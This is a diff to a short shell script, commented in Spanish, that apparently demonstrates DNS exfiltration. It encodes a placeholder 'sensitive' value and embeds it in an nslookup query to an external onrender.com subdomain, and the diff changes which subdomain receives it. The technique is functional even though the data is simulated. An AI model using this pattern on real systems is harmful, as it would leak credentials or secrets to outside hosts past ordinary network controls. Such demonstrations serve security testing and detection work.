@@ -1,4 +1,4 @@
-#!/bin/sh
+﻿#!/bin/sh
 
 # Simulación de un dato confidencial a exfiltrar (ej. un token o credencial)
 DATOS_SENSIBLES="clave_secreta_banco_2026"
@@ -12,7 +12,7 @@ echo "Dato codificado: $DATOS_CODIFICADOS"
 echo "Enviando consulta DNS con el payload incrustado..."
 
 # Se envía la consulta DNS utilizando bind-tools (nslookup)
-nslookup "${DATOS_CODIFICADOS}.servidor-web-dmz-ebl.onrender.com"
+nslookup "${DATOS_CODIFICADOS}.servidor-web-dmz-jpyara.onrender.com"
 
 echo "=== CONSULTA DNS ENVIADA ==="
 
